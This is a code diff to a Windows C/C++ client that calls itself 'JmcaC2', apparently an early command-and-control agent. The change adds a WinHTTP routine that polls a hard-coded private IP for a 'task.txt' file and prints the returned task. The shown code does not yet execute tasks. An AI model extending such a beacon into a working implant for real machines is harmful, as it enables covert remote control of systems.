@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
+#include <winhttp.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 
@@ -13,17 +14,94 @@
 
 // Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
 #pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "winhttp.lib")
 // #pragma comment(lib, "Mswsock.lib")
 // #pragma comment(lib, "AdvApi32.lib")
 
 #define DEFAULT_BUFLEN 512
-#define DEFAULT_PORT \
+#define DEFAULT_TCP_PORT \
     "27015"  // TODO should be configureable but for dev hardcode to MSDN
+#define HTTP_SERVER_IP L"10.240.244.195"
+#define RESOURCE_NAME L"task.txt"
+#define HTTP_VERB L"GET"
+#define HTTP_SERVER_PORT 27015  // We coult just use INTERNET_DEFAULT_PORT
+
+const wchar_t* ACCEPTED_MIME_TYPES[] = {
+    L"text/plain", L"application/octet-stream", L"text/html", NULL};
+
 // TODO: Setup server
 
-int main(int argc, const char** argv) {
-    // INIT SOCKET
+int CreateTCPConn();
+int getHTTPTask();
 
+int getHTTPTask() {
+    // TODO: This should be HTTPS but I'm using HTTP as a starting point
+    // WinHTTP > WinINet
+
+    /*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
+    WinHttpAddRequestHeaders (user-agent/content-type) ->
+    WinHttpSendRequest -> WinHttpReadData -> TASK -> Close / cleanup*/
+
+    // https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/WinHttp/winhttp-sessions-overview.md#using-the-winhttp-api-to-access-the-web
+
+    // returns a WinHTTP-session handle.
+    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
+    bool isRequestSuccessful{}, didReceiveResponse{};
+
+    hHTTPSession =
+        WinHttpOpen(L"JmcaC2 Task Fetching",
+                    WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
+                    WINHTTP_NO_PROXY_BYPASS, 0);  // SYNCHRONOUS (blocking)
+
+    /*does not result in an actual connection to the HTTP server until a
+    request is made for a specific resource*/
+
+    if (hHTTPSession)
+        hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
+                                         (INTERNET_PORT)HTTP_SERVER_PORT, 0);
+
+    if (hHTTPConnection)
+        hHTTPRequest = WinHttpOpenRequest(
+            hHTTPConnection, HTTP_VERB, RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
+            ACCEPTED_MIME_TYPES,
+            WINHTTP_FLAG_REFRESH);  // WINHTTP_FLAG_SECURE for HTTPS
+
+    if (hHTTPRequest)
+        isRequestSuccessful =
+            WinHttpSendRequest(hHTTPRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                               WINHTTP_NO_REQUEST_DATA, 0, 0,
+                               0);  // WINHTTP_NO_REQUEST_DATA
+                                    // should be replaced if POST
+
+    didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL);
+
+    DWORD dwSize = 0;
+
+    while (true) {
+        if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize) break;
+
+        char* outBuffer = new char[dwSize + 1];
+        ZeroMemory(outBuffer, dwSize + 1);
+
+        DWORD dwOut = 0;
+
+        if (!WinHttpReadData(hHTTPRequest, outBuffer, dwSize, &dwOut)) {
+            delete[] outBuffer;
+            break;
+        }
+
+        printf("TASK: %.*s\n", dwOut, outBuffer);
+        delete[] outBuffer;
+    }
+
+    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
+    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
+    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);
+
+    return (int)didReceiveResponse;
+}
+
+int CreateTCPConn(const char** argv) {
     const char* sendbuf = "Hello fr0m JMCAC2";
 
     WSADATA wsaData;
@@ -43,7 +121,7 @@ int main(int argc, const char** argv) {
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    int iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints,
+    int iResult = getaddrinfo(argv[1], DEFAULT_TCP_PORT, &hints,
                               &result);  // Put get address info into result
 
     if (iResult) {
@@ -69,7 +147,7 @@ int main(int argc, const char** argv) {
     if (iResult == SOCKET_ERROR) {
         closesocket(ConnectSocket);
         printf("Failed to connect to server %s:%s, Error:  %d\n", argv[1],
-               DEFAULT_PORT, WSAGetLastError());
+               DEFAULT_TCP_PORT, WSAGetLastError());
         freeaddrinfo(result);
         WSACleanup();
         return 1;
@@ -84,6 +162,12 @@ int main(int argc, const char** argv) {
     }
 
     printf("Bytes Sent: %ld\n", iResult);
-    // MAIN LOOP
-    //  send & recv
+    return 0;
+}
+
+int main(int argc, const char** argv) {
+    /*TODO: Client should be able to send receive (does that mean the HTTP
+     * Request needs to be async?) */
+    getHTTPTask();
+    return 0;
 }
